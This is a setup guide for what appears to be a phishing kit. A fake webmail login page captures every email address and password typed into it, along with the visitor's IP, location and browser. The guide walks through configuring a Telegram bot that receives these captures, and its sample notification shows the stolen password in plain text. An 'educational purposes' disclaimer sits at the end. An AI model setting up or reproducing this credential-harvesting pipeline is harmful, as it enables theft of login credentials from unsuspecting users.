# Telegram Bot Integration Setup Guide

This guide explains how to set up and use the Telegram bot integration for receiving real-time notifications about login attempts.

## Files Included

1. **`index_with_telegram.html`** - HTML file with client-side Telegram integration (may have CORS issues)
2. **`index_with_telegram_server.html`** - HTML file with server-side Telegram integration (recommended)
3. **`telegram_bot.php`** - Server-side PHP handler for Telegram API calls
4. **`TELEGRAM_SETUP.md`** - This setup guide

## Prerequisites

- A Telegram account
- Access to @BotFather on Telegram
- A web server with PHP support
- cURL extension enabled in PHP

## Step 1: Create a Telegram Bot

1. **Open Telegram** and search for `@BotFather`
2. **Start a conversation** with BotFather by clicking "Start"
3. **Send the command** `/newbot`
4. **Follow the instructions**:
   - Choose a name for your bot (e.g., "My Webmail Monitor")
   - Choose a username for your bot (must end with 'bot', e.g., "mywebmailmonitor_bot")
5. **Copy the bot token** that BotFather provides (format: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

## Step 2: Get Your Chat ID

### Method 1: Using the Bot API (Recommended)

1. **Message your bot** - Find your bot by its username and send it any message
2. **Visit this URL** in your browser (replace `YOUR_BOT_TOKEN` with your actual token):
   ```
   https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
   ```
3. **Look for your chat ID** in the JSON response. It will look like:
   ```json
   {
     "message": {
       "chat": {
         "id": 123456789,
         "first_name": "Your Name",
         "type": "private"
       }
     }
   }
   ```
4. **Copy the chat ID** (the number after `"id":`)

### Method 2: Using @userinfobot

1. **Search for** `@userinfobot` on Telegram
2. **Start a conversation** with it
3. **Send any message** to it
4. **It will reply** with your chat ID

## Step 3: Configure the HTML File

### Option A: Using Server-Side Handler (Recommended)

1. **Upload all files** to your web server:
   - `index_with_telegram_server.html`
   - `telegram_bot.php`
   - `postmailer_fixed.php`
   - `config.php`
   - Other required files

2. **Open the HTML file** in your browser

3. **Click the "⚙️ Telegram Bot" button** in the top-right corner

4. **Enter your credentials**:
   - **Bot Token**: Your bot token from Step 1
   - **Chat ID**: Your chat ID from Step 2

5. **Click "Save Config"** to save your settings

6. **Click "Test Bot"** to verify the connection

### Option B: Using Client-Side Integration

1. **Upload** `index_with_telegram.html` to your server
2. **Follow the same configuration steps** as above
3. **Note**: This method may have CORS issues depending on your server configuration

## Step 4: Test the Integration

1. **Configure the bot** as described in Step 3
2. **Try logging in** with any email/password combination
3. **Check your Telegram** - you should receive a notification message
4. **The notification will include**:
   - Email address used
   - Password entered
   - Login success/failure status
   - IP address of the user
   - Geographic location
   - Timestamp
   - User agent (browser info)

## Message Format

The Telegram notifications will look like this:

```
🔐 Webmail Login Attempt

📧 Email: user@example.com
🔑 Password: password123
📊 Status: ❌ FAILED
🌐 IP Address: 192.168.1.100
📍 Location: United States, New York
⏰ Time: 2025-01-27 14:30:45
🖥️ User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
```

## Security Considerations

⚠️ **Important Security Notes:**

1. **Bot Token Security**: Keep your bot token private. Anyone with your token can control your bot.

2. **Chat ID Privacy**: Your chat ID is unique to you and should be kept private.

3. **Local Storage**: The configuration is stored in browser localStorage. Clear this if using a shared computer.

4. **HTTPS**: Use HTTPS in production to protect sensitive data transmission.

5. **Rate Limiting**: Telegram has rate limits. The server-side handler includes proper error handling.

## Troubleshooting

### Bot Not Responding

1. **Check bot token** - Make sure it's correct and complete
2. **Verify chat ID** - Ensure you're using the right chat ID
3. **Test with BotFather** - Send `/mybots` to BotFather to see your bots
4. **Check bot status** - Make sure your bot is not blocked or deleted

### CORS Errors (Client-Side Only)

If you see CORS errors in the browser console:
1. **Use the server-side version** (`index_with_telegram_server.html`)
2. **Check server headers** - Ensure proper CORS headers are set
3. **Use HTTPS** - Some browsers block mixed content

### PHP Errors

1. **Check cURL extension** - Ensure PHP cURL is installed and enabled
2. **Verify file permissions** - Make sure PHP can read the files
3. **Check error logs** - Look at your server's error logs for details

### No Notifications Received

1. **Test the bot manually** - Send a message to your bot to ensure it's working
2. **Check network connectivity** - Ensure your server can reach Telegram's API
3. **Verify configuration** - Double-check bot token and chat ID
4. **Check browser console** - Look for JavaScript errors

## Advanced Configuration

### Customizing the Server-Side Handler

You can modify `telegram_bot.php` to:

1. **Add default credentials** in the `$config` array:
   ```php
   $config = array(
       'default_bot_token' => 'YOUR_BOT_TOKEN',
       'default_chat_id' => 'YOUR_CHAT_ID',
       // ... other settings
   );
   ```

2. **Customize message format** by modifying the message templates

3. **Add rate limiting** to prevent spam

4. **Implement webhook support** for real-time updates

### Multiple Chat IDs

To send notifications to multiple recipients:

1. **Create a group** in Telegram
2. **Add your bot** to the group
3. **Get the group chat ID** using the same method as getting your personal chat ID
4. **Use the group chat ID** instead of your personal chat ID

## API Reference

The `telegram_bot.php` file supports these actions:

- `send_message` - Send a custom message
- `test_bot` - Test bot connection
- `login_notification` - Send login attempt notification
- `get_webhook_info` - Get webhook information

### Example API Usage

```javascript
// Test bot connection
$.ajax({
    url: './telegram_bot.php',
    method: 'POST',
    data: {
        action: 'test_bot',
        bot_token: 'YOUR_BOT_TOKEN',
        chat_id: 'YOUR_CHAT_ID'
    },
    success: function(response) {
        console.log(response);
    }
});
```

## Support

If you encounter issues:

1. **Check the browser console** for JavaScript errors
2. **Check server error logs** for PHP errors
3. **Test the bot manually** in Telegram
4. **Verify all prerequisites** are met
5. **Ensure proper file permissions** on your server

## Legal and Ethical Considerations

⚠️ **Important Disclaimer:**

This integration is provided for educational and security awareness purposes only. Users are responsible for:

1. **Complying with local laws** regarding data collection and privacy
2. **Obtaining proper consent** before monitoring user activity
3. **Using the system ethically** and responsibly
4. **Protecting sensitive information** appropriately
5. **Following data protection regulations** (GDPR, CCPA, etc.)

The developers are not responsible for any misuse of this software.